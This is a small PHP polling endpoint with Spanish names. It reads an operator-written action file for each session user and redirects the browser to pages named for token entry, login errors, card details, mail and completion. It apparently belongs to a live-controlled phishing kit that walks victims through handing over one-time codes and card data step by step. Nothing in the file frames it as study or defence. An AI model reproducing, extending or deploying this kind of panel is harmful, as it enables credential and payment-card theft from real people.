<?php
require_once __DIR__ . '/_guard.php';
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['usuario'])) {
    echo json_encode(["status" => "no_session"]);
    exit;
}

$usuario = $_SESSION['usuario'];
$archivo = __DIR__ . "/acciones/$usuario.txt";
if (file_exists($archivo)) {
    $destino = trim(file_get_contents($archivo));
    unlink($archivo);
    if (in_array($destino, ['index.php', 'token.php', 'tokenerror.php', 'loginerror.php', 'card.php', 'mail.php', 'listo.php'])) {
        echo json_encode(["status" => "redirigir", "destino" => $destino]);
        exit;
    }
}

echo json_encode(["status" => "esperando"]);
